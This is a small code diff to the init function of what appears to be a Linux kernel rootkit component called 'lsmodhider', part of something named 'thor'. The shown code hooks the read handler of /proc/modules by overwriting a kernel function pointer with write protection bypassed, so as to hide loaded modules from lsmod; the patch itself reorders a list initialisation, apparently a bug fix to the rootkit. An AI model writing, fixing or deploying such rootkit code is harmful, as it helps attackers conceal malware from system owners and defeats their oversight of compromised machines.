@@ -56,6 +56,8 @@ int lsmodhider_init(void)
     void *sysmodule_iterate_addr;
     void *procmodules_read_addr;
 
+    INIT_LIST_HEAD(&module_list.list);
+
     filep_sysmodule = filp_open("/sys/module", O_RDONLY, 0);
     if (filep_sysmodule == NULL) {
         LOG_ERROR("could not open /sys/module");
@@ -90,8 +92,6 @@ int lsmodhider_init(void)
 
     procmodules_read_addr = (void*) &thor_procmodules_read;
     write_no_prot(&procmodules_fops->read, &procmodules_read_addr, sizeof(void*));
-
-    INIT_LIST_HEAD(&module_list.list);
 
     return 0;
 }
